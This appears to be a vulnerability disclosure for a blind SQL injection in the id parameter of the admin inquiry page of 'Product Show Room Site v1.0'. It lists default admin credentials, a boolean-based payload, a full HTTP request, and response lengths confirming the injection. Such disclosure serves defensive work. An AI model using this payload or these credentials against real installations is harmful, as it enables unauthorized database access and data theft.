# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/admin/?page=inquiries/view_inquiry&id=

Vulnerability location: /psrs/admin/?page=inquiries/view_inquiry&id=, id

Current database name: psrs_db ,length is 7

[+] Payload: /psrs/admin/?page=inquiries/view_inquiry&id=4%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /psrs/admin/?page=inquiries/view_inquiry&id=4%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

When length (database ()) = 6, Content-Length: 28396
![image](https://user-images.githubusercontent.com/54017627/171830800-dd9eb710-c542-4b1c-92a1-99d227548a33.png)

![image](https://user-images.githubusercontent.com/54017627/171830864-5471ccab-cb64-4a1b-9a35-2022c87a26da.png)

When length (database ()) = 7, Content-Length: 28475
![image](https://user-images.githubusercontent.com/54017627/171830760-5a622ffc-6fb7-47ea-b2b3-1cbd4fad8d5e.png)

![image](https://user-images.githubusercontent.com/54017627/171830834-e1bd7eb6-babd-4957-a33b-515404293935.png)
